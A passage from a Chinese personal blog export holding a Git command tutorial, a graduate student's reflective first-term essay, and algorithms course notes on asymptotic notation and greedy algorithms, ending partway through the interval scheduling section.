Git是目前世界上最先进的分布式版本控制系统。\n\n### 工作流程\n\n![工作流程](https://img.jwt1399.top/img/git.png)\n\n- **工作区：**你在电脑里能看到的目录。\n\n- **暂存区：**准备进行版本保存的文件列表。\n- **本地仓库：**完成版本保存的文件列表。\n- **远程仓库：**例如：自己的GitHub仓库、码云仓库。\n- **提交流程为：**工作区➤暂存区➤本地仓库➤远程仓库\n\n### 专有名词\n\n- master：默认开发分支（最新版本的名字）\n- origin：给远程仓库地址起别名的常用名字（http方式）\n- origin_ssh：给远程仓库地址起别名的常用名字（ssh免密方式）\n- HEAD：当前所在的版本（在分支操作时，也叫没有命名的分支）\n- HEAD^ ：上一个版本\n- HEAD^^ ：上上个版本\n- HEAD~n：前n个版本\n\n## 配置用户信息\n\n### 全局配置\n\n```bash\ngit config --global user.name \"Your Name\"\ngit config --global user.email \"email@example.com\"\n```\n\n### 单独配置\n\n```bash\n#对某个项目想单独配置信息可以使用\ngit config user.name \"Your Name\" \ngit config user.email \"email@example.com\"\n```\n\n### 查看配置\n\n```bash\ngit config --global user.name #查看配置的全局名字\ngit config --global user.email #查看配置的全局邮箱地址\ngit config --list #查看当前项目的git配置信息（会先列出全局配置，最下面列出的是当前项目的配置）整页翻页 ctrl-f(往前翻) ctrl-b(往后翻)\n```\n\n## 仓库的创建与提交\n\n### 创建仓库\n\n```bash\ngit init\n```\n\n### 提交文件\n\n```bash\n#第一步：把文件添加到暂存区\ngit add <file> #添加单个文件\ngit add .      #添加所有文件\n\n#第二步，把暂存区文件提交到本地仓库\ngit commit -m <message>\n```\n\n例子：新建learngit文件夹，并将该文件夹初始化为Git仓库，再向仓库中添加一个test.txt文件\n\n```bash\nmkdir learngit\ncd learngit\ngit init\n\nvim test.txt\ngit add test.txt\ngit commit -m \"add a test file\"\n```\n\n## 版本回退（回到过去）\n\n### 软回退\n\n将当前分⽀回滚到指定版本，保持⼯作区和暂存区状态不变。\n\n```bash\ngit reset --soft HEAD^  #回退到上一个版本\n\ngit reset --soft HEAD~n #回退到前n个版本\n\ngit reset --soft <commit id> #回退到指定版本,id可通过git log查看\n```\n\n### 混合回退\n\n将当前分⽀回滚到指定版本，清除暂存区的修改，但保持⼯作区状态不变。\n\n```bash\ngit reset HEAD^  #回退到上一个版本\n\ngit reset HEAD~n #回退到前n个版本\n\ngit reset  <commit id> #回退到指定版本,id可通过git log查看\n```\n\n### 强制回退\n\n将当前分⽀回滚到指定版本，清除暂存区的修改，并强制删除所有⼯作区的修改\n\n```bash\ngit reset --hard HEAD^  #回退到上一个版本\n\ngit reset --hard HEAD~n #回退到前n个版本\n\ngit reset --hard <commit id> #回退到指定版本,id可通过git log查看\n```\n\n## 回退取消（重返未来）\n\n现在，你回退到了某个版本，关掉了电脑(无法使用git log 查看到回退前的commit id)，第二天早上就后悔了，想恢复到回退前的版本怎么办？但是找不到回退前版本的`commit id`怎么办？\n\n```bash\ngit reflog #查看所有的历史命令，获取你想要回到的版本id，\n\ngit reset --hard <commit id> #回退到该版本\n```\n\n## 分支管理（平行宇宙）\n\n### 分支简介\n\nGit用`master`指向最新的提交，再用`HEAD`指向`master`，就能确定当前分支，以及当前分支的提交点\n\n![初始分支](https://img.jwt1399.top/img/0.png)\n\nGit新建一个指针叫`dev`，指向`master`相同的提交，再把`HEAD`指向`dev`，就表示当前分支在`dev`上\n\n![新建分支](https://img.jwt1399.top/img/l.png)\n\n对工作区的修改和提交就是针对`dev`分支了，比如新提交一次后，`dev`指针往前移动一步，而`master`指针不变\n\n![新分支开发](https://img.jwt1399.top/img/l-20220107134257366.png)\n\n假如我们在`dev`上的工作完成了，就可以把`dev`合并到`master`上。就是直接把`master`指向`dev`的当前提交，就完成了合并\n\n![合并分支](https://img.jwt1399.top/img/0-20220107134527384.png)\n\n合并完分支后，甚至可以删除`dev`分支。删除`dev`分支就是把`dev`指针给删掉，删掉后，我们就剩下了一条`master`分支\n\n![删除分支](https://img.jwt1399.top/img/0-20220107134635390.png)\n\n### 创建分支\n\n```bash\ngit branch [branch_name]\n```\n\n### \t切换分支\n\n```bash\ngit checkout [branch_name]\n\ngit switch [branch_name]\n```\n\n### 创建并切换\n\n```bash\ngit checkout -b [branch_name]\n\ngit switch -c [branch_name]\n```\n\n### 合并分支\n\n```bash\ngit merge [branch_name] #用于合并指定分支到当前分支\n```\n\n### 删除分支\n\n```bash\ngit branch -d [branch_name]\n```\n\n### 查看分支\n\n```bash\ngit branch -vv #查看当前开发分支(当前分支前面会标一个*号)\ngit branch #查看本地所有分支\ngit branch -r #查看远程所有分支\ngit branch -a #查看本地和远程所有分支\n```\n\n## 查看提交历史\n\n```bash\ngit log  #查看历史提交记录\ngit log --pretty=oneline #查看简洁版历史提交记录\ngit log --graph #查看历史提交记录拓扑图\ngit log -p <file> #指定文件的历史提交记录\ngit blame <file> #查看指定文件的历史修改记录\n```\n\n更多 git log 命令可查看：http://git-scm.com/docs/git-log\n\n## 一些常用命令\n\n```bash\ngit status  #查看项目文件此时的状态（在工作区、缓存区还是在仓库中）\n\ngit reflog #查看所有的历史命令\n\ngit remote -v #查看远程仓库地址\n\ngit diff #⽐较⼯作区和暂存区的修改\n\ngit diff HEAD #⽐较⼯作区和上⼀次commit后的修改。 \n\ngit diff --cached #⽐较暂存区和上⼀次commit后的修改。\n```\n\n## SourceTree\n\n> 一款用于Windows和Mac的免费Git可视化管理工具。\n\n详细用法可参考：\n\n[git的GUI工具Sourcetree使用及命令行对比](https://juejin.cn/post/6844903639404773383)\n\n[Git/SourceTree版本管理_bilibili](https://www.bilibili.com/video/BV1Ev411j7e5?p=1)\n\n## Reference\n\n- [git命令与Sourcetree使用 ](https://www.cnblogs.com/Lencamo/p/15304086.html)\n- [Git教程 - 廖雪峰的官方网站 (liaoxuefeng.com)](https://www.liaoxuefeng.com/wiki/896043488029600)\n- [git-cheat-sheet (gitee.io)](https://liaoxuefeng.gitee.io/resource.liaoxuefeng.com/git/git-cheat-sheet.pdf)\n- [Git 教程 | 菜鸟教程 (runoob.com)](https://www.runoob.com/git/git-tutorial.html)\n- [Git使用教程：最详细、最傻瓜、最浅显、真正手把手教！](https://mp.weixin.qq.com/s?__biz=MzI1NDQ3MjQxNA==&mid=2247487262&idx=2&sn=5c2aa3be4a9422e7b778e245daf5389f&chksm=e9c5f6afdeb27fb9defa48fd7c279662c3a3b72ec787f158af270ec392275bbeb6e070b2f22c&mpshare=1&scene=23&srcid=1017gdrlB3XPLoviLBJD7wA4#rd)\n- [Git使用教程](https://zhuanlan.zhihu.com/p/263000017)\n- [Git分布式版本控制器常用命令和使用 ](https://www.cnblogs.com/Can-daydayup/p/10134733.html)\n\n## Sponsor❤️\n\n您的支持是我不断前进的动力，如果你觉得本文对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Git"],"categories":["Tools"]},{"title":"研一上总结","url":"/posts/52395.html","content":"\n## 研一上\n\n### 碎碎念\n\n现在是 2021年12月03日08点43分，此时我正在成都开往XX的火车上，因为多臭美了 10 分钟，加之去往地铁站的路上有一点点堵车，我差点没有赶上火车，幸运的是我在停止检票的前一分钟顺利冲进了站点，此刻望着窗外转瞬即逝的风景，顿时心中感触良多，想着研一上学期的生活就要接近尾声了，这短短的几个月经历了很多，学会了很多，明白了很多。其实事先没有想过要写一个总结，但是一学期快结束了，似乎什么都没有留下，心里面空落落的，实在是不舒服的很，所以想借这个静下来的时间好好回想回想自己这一学期到底干了些什么，给自己找点心里安慰。\n\n时间拨回今年盛夏，可能这个夏天是我最无忧无虑的日子了吧， 顺利保研，没有找工作的压力，手术也还算成功，导师也没有提前让我去干活，我每天做着自己喜欢的事，时而憧憬着我的研究生生活。就这样憧憬着憧憬着，我踏进了成电校园，迎接我的不是美好的校园生活，相反各种琐碎的事纷至沓来，我仿佛又回到了刚从小镇离开去到大学的那段时光，但又完全不同，那时的我无知懵懂，对一切充满好奇，没有那么多抱怨，现在的我好像真的变了，遇到烦心的事总是先抱怨一番，但这里的生活跟我想象的真的不太一样。\n\n刚开学的一个月，整个人都处于彷徨阶段，也许并不只是这一个月是彷徨的，或许这两年都是彷徨的。我害怕新环境，所以整天跟实验室的小伙伴呆在一起，一起上课，一起吃饭，一起去实验室，一起玩耍。这样的日子应该只能叫做开心吧，无忧无虑却一事无成。这样的平静随着两个小伙伴的一次小矛盾被打破，群里聊天的声音少了，大家呆在一起的时间也少了，可能年纪越大我们也愈加变得敏感了，可能一不小心自己的某个无心之举就会伤害到人，但我总是后知后觉的。\n\n突然困意来袭，我想先睡一会(尽管颠簸，我想我依然会睡得很香，逃离学校我能得到短暂的放松)，等我醒了我再继续写吧。。。现在是 12点50分 ，火车还在飞速的往前行驶。\n\n回到学习吧，我以为能在课堂上学到很多东西的，但老师似乎更适合理论研究，并不太擅长讲课，大部分的课程也都比较水，但作业倒是挺多的，感觉大部分时间我都在写作业中度过，仅能抽出小部分时间学我想学的东西，我一度不适应这样的生活，整日靠颓废来麻痹自己。因为性格的原因，各方面表现的并不是很好，研究生生活更加重视自我展现，这恰好不是我擅长的，我喜欢在自己的小角落里生活，我不喜欢大家关注我，讨论什么的并不积极，除了汇报什么的非我上不可时才上。生活上，貌似也不太顺心，食堂不好吃，运动场离宿舍太远，实验室也太远，真正让我觉得不适应的是，这里没有一群好朋友，我时常一个人去食堂吃饭，一个人去打球。孤独，大概是我研一上最深的感触。研究生阶段，大家的交集并不多，都是各自前行。我用了很久，适应自己独处，自己吃饭，自己去图书馆自习，自己一个人运动。现在的我还做不到享受孤独，等我真正享受孤独的时候，我可能才算是真正的成长了吧。\n\n​\t2021年12月9日，救命啊，任务好多啊，三个实验项目，一个论文，三堂考试，导师还叫我看论文，所有的事都要这两周完成，好像拥有分身的超能力😭\n\n2021年12月31日，所有的事情都顺利完成了，好像也没有那么难，哎，我这同时处理多件事情就烦躁的性子什么时候能改变啊。\n\n​\t\t未完待续。。。\n\n## 研一下\n\n待更新\n\n## 读研感悟\n\n如何与人相处是我最近一直在思考的一个问题。我自认为我的情商还算可以吧，因为我很能善解人意，会去照顾别人的情绪，而且我真的是用心去相处。但其实，并不是所有人都会对你友善，也并不是所有人都会去考虑你的感受。以前，我非常在意别人对我的看法，因此，我很努力地让别人喜欢我，我会迁就别人，我会包容别人，哪怕自己有时候特别委屈。这样让自己过的很难受，而且我也没有办法做到让所有人都喜欢我，无论我做什么，我也不可能和所有人成为好朋友，时间和精力都不允许。所以有的人见面可以寒暄，但是可以不用私下经常聊天；有的人可以约着一起吃饭，但是可以不去参与他的八卦。现在我的态度就是，尽量与人为善，坦率真诚，不去议论，不去刻意。合不来的人，就是合不来，并不是谁的错，你总能找到能理解你的人，能跟你走在一起的人。其实，也真的没有必要去刻意讨好谁，你自己的路，别人也帮不了你太多。相比于结识新的朋友，我们更应该看到身边人，珍惜已有的朋友。\n\n研究生阶段，同学更像同事，没有多少人是来交朋友的。大家更像是彼此成长道路上互相竞赛的竞争者。其实转换为这种心态，就会好很多了。都说大学就是一个小社会，研究生阶段更是如此，大家对于未来的准备会更加积极、迫切，会花更少的时间经营友谊，更多的时间提升自己。每个人都是最关心自己的。也许我们不能成为朋友，但我们也可以成为互相尊敬的竞争对手。\n\n另外一个很重要的是开心啦，做人嘛，最重要的就是开心啰，我们不要为了一些鸡毛蒜皮的小事而不开心，糟心的事不应该占据我们生活的主要部分，希望自己快乐的同时，也能带给身边人快乐，不要吝啬自己的赞美，多夸夸别人，比自己厉害要虚心学习，对于比自己弱的也不要瞧不起别人，在某个方面看起来不如你，在其他方面也一定有优于你的地方，每个人都有自己的优缺点，发自内心的尊重他人，他人也会尊重你。不要傻乎乎的只会学习啊，偶尔的娱乐会让自己的学习效率更高，人也会更开心。\n\n## 未来计划\n\n- 少玩手机，多锻炼，多读书\n- 学习 Java 相关的知识\n- 坚持写总结\n\n未完待续。。。暂时想到的就这么多，不定期更新吧！\n\n### **💓Sponsor**\n\n您的支持是我不断前进的动力，如果你觉得本文对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["总结"],"categories":["Share"]},{"title":"高级算法设计与分析","url":"/posts/46989.html","content":"\n## ⓪前言\n\n本科的时候上过《数据结构与算法》课，但彼时天真的以为搞安全不需要懂太多算法，算法部分也就没有深入去学习，没想到读研还是没能逃过，此时也已经意识到算法的重要性，初学算法时真的觉得这东西晦涩难懂，貌似毫无用处，但渐渐明白搞懂算法背后的核心思想能让你写出更加优雅的代码。作此文的目的有四，一来是复习本科阶段学了但又遗忘的知识；二来感到近日记忆力下降明显，学过的东西不一会就忘了，记下来以便日后复习吧，再者好记性不如烂笔头；三来是以此做为 UESTC 研一《高级算法设计与分析》课程的期末复习笔记；四来是希望能给此时正在看此文的你一点点帮助吧。小简的水平和精力有限，文章中难免存在一些错误和不足，恳请读者批评指正，如发现错误，请及时与简简联系进行更正，我们共同使文章更加完善，大家可以在评论区留下自己想法，一起交流，谢谢🙏\n\n`课件下载：`https://jwt1399.lanzouo.com/b01cy151a 密码:1399\n\n## ①算法引论\n\n> **本章重点：**\n>\n> - 理解什么是算法，算法的特征，算法和程序的差别；\n> - 理解什么是判断问题和优化问题。\n\n### ❶什么是算法\n\n- **算法**是求解问题的一系列计算步骤，用来将输入数据转换成输出结果    `从蛮力到策略`\n- **数据结构**是数据的组织与存储：`从杂乱无章到井然有序`\n- **算法 + 数据结构 = 程序**\n\n### ❷算法的特征\n\n- 输入性：必须有0个或多个输入（待处理信息） \n\n- 输出性：应有一个或多个输出（已处理信息） \n\n- 确定性：组成算法的每条指令是清晰的、无歧义\n\n- 有穷性：算法必须总能在执行有限步之后终止\n\n### ❸什么是好算法\n\n- 正确性：符合语法、编译通过；\n\n- 健壮性：能辨别不合法的输入并做适当的处理，不至于异常退出（崩溃） \n\n- 可读性：结构化 + 准确的命名 + 注释 \n- 效率性：速度尽可能快；存储空间尽可能少\n\n### ❹算法和程序的差别\n\n- 程序是算法用某种程序语言的一个具体实现\n- 程序是用来给计算机读的，算法是给人来读的\n- 程序可以不满足算法的有穷性。\n\n### ❺判断问题和优化问题\n\n- **判断问题**：是否存在一个...(如小于k的点覆盖)\n- **优化问题**：找出最大/最小的...(最小点覆盖)\n\n很多经典的难问题都是优化问题，而一个优化问题往往可以转换成对应的判断问题。\n\n### ❻经典算法分析\n\n贪心算法：逐步建立一个解决方案，具体地优化一些局部准则。 自顶向下。\n\n分治算法：将一个问题分解成独立的子问题，求解每个子问题，并将子问题的解组合起来形成原问题的解。  自顶向下。\n\n动态规划：把一个问题分解成一系列相互重叠的子问题，并为越来越大的子问题建立解决方案。自底向上。\n\n## ②算法复杂度\n\n> **本章重点：**\n>\n> - 理解指数增长的恐怖；理解算法分析里为什么常数倍的差别可以被忽略\n>\n> - 掌握渐近符号O、W、Q的含义，能判断一个函数属于哪个渐近增长阶；\n>\n> - 能对给定函数按照渐进增长率进行排序，典型考题：\n\n### ❶渐近符号\n\n![Θ,O,Ω的图像表示](https://img.jwt1399.top//img/20211016202335.jpeg)\n\n**Θ(渐近紧确界)：**\n\n- 存在正常数 c<sub>1</sub> , c<sub>2</sub>和 n<sub>0</sub> 使得对所有n ≥ n<sub>0</sub>有：c<sub>1</sub>g(n) ≤ f(n) ≤ c<sub>2</sub>g(n)，记为f(n) ∈ Θ(g(n))\n\n- 例如：n<sup>2</sup>+3n+2∈Θ(n<sup>2</sup>)、n(n-1)/2∈Θ (n<sup>2</sup>)、4n<sup>2</sup>+5 ∈Θ (n<sup>2</sup>)\n\n**O(渐近上界)：**\n\n- 存在正常数 c 和 n<sub>0</sub> 使得对所有n ≥ n<sub>0</sub>有：f(n) ≤  cg(n)，记为f(n) ∈ O(g(n))\n\n- 例如：n ∈O(n<sup>2</sup>)、100n+5 ∈O(n<sup>2</sup>)、n(n-1)/2 ∈O(n<sup>2</sup>)\n\n**Ω(渐近下界)：**\n\n- 存在正常数 c 和 n<sub>0</sub> 使得对所有n ≥ n<sub>0</sub>有：f(n) ≥ cg(n)，记为f(n) ∈ Ω(g(n))\n- 例如：n<sup>3</sup>∈Ω (n<sup>2</sup>)、n(n+1)∈Ω (n<sup>2</sup>)、4n<sup>2</sup>+5 ∈Ω (n<sup>2</sup>)\n\n![](https://img.jwt1399.top//img/20211016205620.png)\n\n### ❷复杂度\n\n>  时间复杂度具有「最差」、「平均」、「最佳」三种情况，分别使用 O , Θ , Ω 三种符号表示。\n\n根据从小到大排列，常见的算法时间复杂度主要有：\n\nO(1) < O(logn)<O(n)<O(nlogn)<O(n<sup>2</sup>)<O(n<sup>3</sup>)<O(2<sup>n</sup>)<O(n!)<O(n<sup>n</sup>)\n\n![](https://img.jwt1399.top//img/20211016203924.png)\n\n### ❸渐进增长率比较\n\n方法1：**定义法**\n\n找到正常数 c 和 n<sub>0</sub> 使得对所有n ≥ n<sub>0</sub> 有 f\\(n\\) ≤ cg(n)，则f(n) = O(g(n))\n\n方法2：**极限法**\n\n比较两个函数f(n)和g(n)的渐近增长率时，可以对两个函数相除，然后令变量 n 趋向于无穷，看这个极限值是无穷大还是一个大于零的常数还是趋向于0。\n\n![](https://img.jwt1399.top/img/image-20211016205209274.png)\n\n- 前两种情况意味着f(n) ∈ O(g(n))\n- 后两种情况意味着f(n) ∈ Ω(g(n))\n- 第二种情况意味着f(n) ∈ Θ(g(n))\n\n方法3：**取对数法**\n\n对于比较难的比较的两个函数，我们可以对它们同时取对数后再进行比较\n\n`常见对数公式：`\n\n- log<sub>a</sub>m*n = log<sub>a</sub>m + log<sub>a</sub>n\n\n- log<sub>a</sub>(m/n) = log<sub>a</sub>m - log<sub>a</sub>n\n- log<sub>a</sub>m<sup>n</sup> = nlog<sub>a</sub>m\n- log<sub>a</sub><sup>n</sup>√m = (1/n)log<sub>a</sub>m\n- log<sub>a</sub>b = log<sub>c</sub>b / log<sub>c</sub>a \n- a<sup>log<sub>a</sub>b</sup> = b\n\n### ❹真题练习\n\n#### ➀题目1\n\n判断 f(n) = 32n<sup>2</sup> + 17n + 32 属于哪些渐近增长阶\nO(n), Ω(n), Θ(n), O(n<sup>2</sup>), Θ(n<sup>2</sup>), Ω(n<sup>2</sup>),O(n<sup>3</sup>), Ω(n<sup>3</sup>), Θ(n<sup>3</sup>). \n\nf(n) 属于 Ω(n),O(n<sup>2</sup>), Ω(n<sup>2</sup>), Θ(n<sup>2</sup>) ,O(n<sup>3</sup>) \nf(n) 不属于 O(n), Θ(n), Ω(n<sup>3</sup>), Θ(n<sup>3</sup>)\n\n#### ➁题目2\n\n![](https://img.jwt1399.top//img/20211016213402.png)\n\nf<sub>1</sub>(n) = √n + log<sup>100</sup>n = O(√n)\n\nf<sub>2</sub>(n) = 2<sup>logn</sup> * 2<sup>loglogn</sup> = nlogn\n\nf<sub>3</sub>(n) = 100logn + nlog3 = O(n)\n\nf<sub>4</sub>(n) = O(3<sup>n</sup>)、f<sub>5</sub>(n) = 100log<sup>2</sup>n、f<sub>6</sub>(n) =  O(n!)\n\n(1)显然 f<sub>3</sub>(n) ＜ f<sub>2</sub>(n) ＜ f<sub>4</sub>(n)＜f<sub>6</sub>(n) \n\n(2)f<sub>5</sub>(n) 是对数的幂，f<sub>1</sub>(n) 是幂函数，因此 f<sub>5</sub>(n)＜ f<sub>1</sub>(n)\n\n综上所述： f<sub>5</sub>(n) ＜ f<sub>1</sub>(n)＜ f<sub>3</sub>(n) ＜ f<sub>2</sub>(n) ＜ f<sub>4</sub>(n)＜f<sub>6</sub>(n) \n\n#### ➂题目3\n\n![](https://img.jwt1399.top//img/20211016213526.png)\n\nf<sub>1</sub>(n) = nlog<sup>n</sup>n 、f<sub>2</sub>(n) = logn、f<sub>3</sub>(n) = log<sup>5</sup>n \n\nf<sub>4</sub>(n) = n<sup>1/5</sup>、f<sub>5</sub>(n) = n<sup>1/10</sup>log<sup>50</sup>n\n\n(1)f<sub>2</sub>(n)＜ f<sub>3</sub>(n)\n\n(2)f<sub>3</sub>(n)是对数的幂，f<sub>4</sub>(n) 是幂函数，因此 f<sub>3</sub>(n)＜ f<sub>4</sub>(n)\n\n(3) lim f<sub>1</sub>(n)/ f<sub>4</sub>(n) = lim (n<sup>4/5</sup>log<sup>n</sup>n) = ∞ ，因此 f<sub>4</sub>(n) < f<sub>1</sub>(n) \n\n​\t\tlim f<sub>5</sub>(n)/ f<sub>4</sub>(n) = lim (n<sup>-1/10</sup>log<sup>50</sup>n) = 0 ，因此 f<sub>5</sub>(n) < f<sub>4</sub>(n) \n\n(4)对f<sub>1</sub>(n)、f<sub>3</sub>(n)、f<sub>5</sub>(n)取对数\n\n​\tlogf<sub>1</sub>(n) = logn + nloglogn = Θ(nloglogn) = O(n)\n\n​\tlogf<sub>3</sub>(n) = 5loglogn = O(loglogn)\n\n​\tlogf<sub>5</sub>(n) = (1/10)logn + 50loglogn = O(logn)\n\n因此 f<sub>3</sub>(n) ＜ f<sub>5</sub>(n) ＜ f<sub>1</sub>(n)\n\n综上所述： f<sub>2</sub>(n)＜ f<sub>3</sub>(n)＜ f<sub>5</sub>(n) ＜ f<sub>4</sub>(n)＜ f<sub>1</sub>(n)\n\n#### ➃题目4\n\n![](https://img.jwt1399.top/img/202111161254116.png)\n\n对f<sub>1</sub>(n)、f<sub>2</sub>(n)、f<sub>3</sub>(n)、f<sub>3</sub>(n)、f<sub>5</sub>(n)取对数\n\n​\tlogf<sub>1</sub>(n) = nlog10 = O(n)\n\n​\tlogf<sub>2</sub>(n) = 1/3logn = O(logn)\n\n​\tlogf<sub>3</sub>(n) = nlogn = O(nlogn)\n\n​\tlogf<sub>4</sub>(n) = loglogn = O(loglogn)\n\n​\tlogf<sub>5</sub>(n) = √logn = O(√logn)\n\n因此 f<sub>4</sub>(n)＜f<sub>5</sub>(n)＜ f<sub>2</sub>(n)＜ f<sub>1</sub>(n) ＜ f<sub>3</sub>(n) \n\n#### ➄题目5\n\n![](https://img.jwt1399.top//img/20211021120457.png)\n\nf<sub>2</sub>(n) = 2<sup>logn</sup>*2<sup>loglogn</sup> = nlogn\n\nlim f<sub>1</sub>(n)/ f<sub>2</sub>(n) = lim (log<sup>99</sup>n) = ∞ ，因此 f<sub>2</sub>(n) < f<sub>1</sub>(n) \n\nlim f<sub>1</sub>(n)/ f<sub>3</sub>(n) = lim (log<sup>99.5</sup>n/n<sup>0.25</sup>) = 0 ，因此 f<sub>1</sub>(n) < f<sub>3</sub>(n) \n\nlim f<sub>5</sub>(n)/ f<sub>3</sub>(n) = L = ∞ ，因此 f<sub>3</sub>(n) < f<sub>5</sub>(n) \n\nlim f<sub>5</sub>(n)/ f<sub>4</sub>(n) = L = 0 ，因此 f<sub>5</sub>(n) < f<sub>4</sub>(n) \n\n综上所述： f<sub>2</sub>(n)＜f<sub>1</sub>(n)＜ f<sub>3</sub>(n)＜ f<sub>5</sub>(n) ＜ f<sub>4</sub>(n) \n\n#### ➅题目6\n\n![](https://img.jwt1399.top//img/20211021120454.png)\n\nf<sub>1</sub>(n) = nlog<sup>n</sup>n、f<sub>2</sub>(n) = 100log<sup>2</sup>n、f<sub>3</sub>(n) = n<sup>2</sup>logn、f<sub>4</sub>(n) = nlogn、f<sub>5</sub>(n) = n<sup>1/10</sup>\n\n(1)显然 f<sub>4</sub>(n)＜f<sub>1</sub>(n)\n\n(2)f<sub>2</sub>(n)是对数的幂，f<sub>5</sub>(n) 是幂函数，因此 f<sub>2</sub>(n)＜ f<sub>5</sub>(n)\n\n(3)lim f<sub>3</sub>(n)/ f<sub>5</sub>(n) = lim (n<sup>19/10</sup>logn) = ∞ ，因此 f<sub>5</sub>(n) < f<sub>3</sub>(n) \n\nlim f<sub>1</sub>(n)/ f<sub>2</sub>(n) = lim (nlog<sup>n-2</sup>n/100) = ∞ ，因此 f<sub>2</sub>(n) < f<sub>1</sub>(n) \n\nlim f<sub>2</sub>(n)/ f<sub>4</sub>(n) = lim (100logn/n) = 0 ，因此 f<sub>2</sub>(n) < f<sub>4</sub>(n) \n\nlim f<sub>5</sub>(n)/ f<sub>4</sub>(n) = lim (100logn/n) = 0 ，因此 f<sub>5</sub>(n) < f<sub>4</sub>(n) \n\nlim f<sub>3</sub>(n)/ f<sub>4</sub>(n) = lim (100logn/n) = ∞ ，因此 f<sub>4</sub>(n) < f<sub>3</sub>(n) \n\nlim f<sub>1</sub>(n)/ f<sub>3</sub>(n) = lim ((log<sup>n-1</sup>n)/n) = ∞ ，因此 f<sub>3</sub>(n) < f<sub>1</sub>(n) \n\n综上所述：  f<sub>2</sub>(n) ＜ f<sub>5</sub>(n) ＜ f<sub>4</sub>(n)＜ f<sub>3</sub>(n)＜f<sub>1</sub>(n)\n\n## ③贪心算法\n\n> **本章重点：**\n>\n> - 理解贪心算法的思想；\n> - 能判断一个算法是否为贪心算法；\n> - 掌握工作安排问题Interval scheduling的贪心算法及其正确性证明。\n\n### ❶算法分析\n\n贪心算法就是用计算机模拟一个「贪心的人」来做出决策。这个贪心的人是目光短浅的，他每次总是：\n\n- 只做出**当前看来最好的选择**\n- **只看眼前的利益，而不考虑做出选择后对未来造成的影响**\n- 并且他一旦做出了选择，就**没有办法反悔**（不可回溯）\n\n`总结：`在对问题求解时，总是做出在**当前最好的选择**。也就是说并**不从整体最优考虑**，他所做出的是在某种意义上的**局部最优解**。 因此贪心算法不是对**所有问题**都能得到整体最优解。\n\n**应用场景**\n\n解决一个问题需要多个步骤，每一个步骤有多种选择。**想清楚局部最优，想清楚全局最优，感觉局部最优是可以推出全局最优，并想不出反例，那么就试一试贪心**。\n\n **解题步骤**\n\n贪心算法一般分为如下三步：\n\n- **1.分解：**将问题分解为若干个子问题\n- **2.解决：**找出适合的贪心策略，求解每一个子问题的最优解\n- **3.合并：**将局部最优解堆叠成全局最优解\n\n### ❷正确性证明\n\n> **贪心算法最难的部分不在于问题的求解，而在于正确性的证明**，常用的证明方法有**归纳法**和**反证法**。\n\n#### ➀证明方法\n\n- 先假设贪心算法得到的解不是最优解，假设 S1 是贪心算法得到的解，S2 是所有最优解中和 S1 具有最多相同元素的解；\n- 然后比较 S1 和 S2，观察 S1 和 S2 中第一个（最前面一个）不一样的元素；\n- 然后在解 S2 中将不一样的元素换成 S1 中的那个元素得到另一个最优解 S3，这样 S3 和 S1 比 S2 和 S1有更多相同元素，和假设 S2 是与 S1 有最多相同元素的最优解矛盾，这样来推导 S1 是最优解。\n\n#### ➁真题练习\n\n有一堆货物需要被运走，现在有四种运货车：推车的容量最小，小货车的容量是推车容量的2倍，中货车的容量是两辆小货车的容量加上一辆推车的容量，大货车的容量是一辆中货车的容量加上一辆小货车的容量再加上两辆推车的容量。假设以上四种车的数量都非常多。现在要求你设计一种方案派出最少辆车将货物全搬走，其中除了推车以外其它三种车都必须装满才能发车。为这个问题设计一个算法，并证明该算法的正确性。  （8分）\n\n------\n\n 参考答案：\n\n 贪心算法：\n\n将车型按容量由大至小排列，能装满容量大的车就先装满发车，不行就考虑容量小一级的车。\n\n 证明：\n\n设我们算法给出的结果为S1，即推车、小货车、中货车、大货车各a1，a2，a3，a4辆；S2 是所有最优解中和 S1 具有最多相同元素的解，即推车、小货车、中货车、大货车各b1，b2，b3，b4辆。假设 S1 和 S2 不一样，即 ai 和 bi 不一样。\n\n如果i=4，则将 S2 中两个中货车（或者4个小货车）换成一个大货车和一个推车，或者一个中货车和两个小货车（或者。。。。）换成一个大货车。\n\n如果i=3，则将 S2 中两个小货车和一个推车换成一个中货车；。。。\n\n如果i=2，两个推车换成一个小货车。\n\n通过如上变换得到另一个最优解 S3，这样 S3 和 S1 比 S2 和 S1有更多相同元素，和假设 S2 是与 S1 有最多相同元素的最优解矛盾，这样来推导 S1 是最优解。\n\n### ❸区间调度(活动安排)\n\n>**问题描述：**设有 n 个活动的集合 E={1, 2, …, n}，其中任意活动 i 都有一个起始时间 s<sub>i</sub> 和一个结束时间 f<sub>i</sub> 。如果选择了活动 i，则它在半开时间区间 [s<sub>i</sub> , f<sub>i</sub>) 内占用资源。若区间 [s<sub>i</sub> , f<sub>i</sub>) 与区间 [s<sub>j</sub> , f<sub>j</sub>) 不相交，则称**活动 i 与活动 j 是相容**的。每个活动都要求使用同一资源，如演讲会场等，而在同一时间内只有一个活动能使用这一资源。活动安排问题就是要在所给的活动集合中选出最大的相容活动子集合。\n\n#### ➀理论分析\n\n例如有如下 11 个活动，s[i] 代表第 i 个活动开始时间，f[i] 代表第 i 个活动的结束时间，选出最大的相容活动子集合\n\n![](https://img.jwt1399.top//img/20211017214614.jpg)\n\n**1、分析问题**\n\n本问题为选择尽可能多的相容活动\n\n约束条件是下一个活动开始时间大于或等于上一个活动结束时间 s[i] >= f[j]\n\n**2、选择适合的贪心策略**\n\n可能的贪心选择策略：\n\n- ①每次选择**开始时间最早**的活动\n- ②每次选择**持续时间最短**的活动\n- 